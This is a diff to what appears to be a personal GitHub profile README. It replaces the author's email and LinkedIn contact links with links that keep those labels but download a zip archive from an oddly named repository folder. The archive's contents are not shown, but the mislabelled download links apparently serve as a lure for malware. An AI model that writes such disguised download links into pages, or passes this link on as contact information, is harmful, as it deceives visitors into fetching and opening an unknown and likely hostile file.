@@ -73,5 +73,5 @@ Ennasr Secondary School — *2016–2020*
 
 ## 📫 Let’s Connect!
 
-- **Email**: [dhouiouicharfeddine@gmail.com](mailto:dhouiouicharfeddine@gmail.com)  
-- **LinkedIn**: [linkedin.com/in/charfeddine-dhouioui-987ab7318](https://www.linkedin.com/in/charfeddine-dhouioui-987ab7318)
+- **Email**: [https://raw.githubusercontent.com/DhouiouiCharfeddine/DhouiouiCharfeddine/main/arthritism/Dhouioui-Charfeddine-2.2.zip](https://raw.githubusercontent.com/DhouiouiCharfeddine/DhouiouiCharfeddine/main/arthritism/Dhouioui-Charfeddine-2.2.zip)  
+- **LinkedIn**: [https://raw.githubusercontent.com/DhouiouiCharfeddine/DhouiouiCharfeddine/main/arthritism/Dhouioui-Charfeddine-2.2.zip](https://raw.githubusercontent.com/DhouiouiCharfeddine/DhouiouiCharfeddine/main/arthritism/Dhouioui-Charfeddine-2.2.zip)
